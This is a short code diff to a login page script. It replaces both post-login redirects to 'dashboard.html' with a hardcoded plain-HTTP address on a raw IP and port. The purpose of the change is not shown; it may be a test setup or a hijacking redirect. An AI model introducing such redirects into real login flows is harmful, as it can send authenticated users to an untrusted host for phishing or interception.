@@ -562,7 +562,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
       
       // Verify session before redirect
       setTimeout(() => {
-        window.location.href = 'dashboard.html';
+        window.location.href = 'http://44.223.23.145:8011/';
       }, 1500);
     } else {
       errorMessage.textContent = data.error || 'Login failed';
@@ -588,7 +588,7 @@ document.addEventListener('DOMContentLoaded', () => {
   if (token) {
     showAlert('info', 'You are already logged in. Redirecting...');
     setTimeout(() => {
-      window.location.href = 'dashboard.html';
+      window.location.href = 'http://44.223.23.145:8011/';
     }, 1000);
   }
   
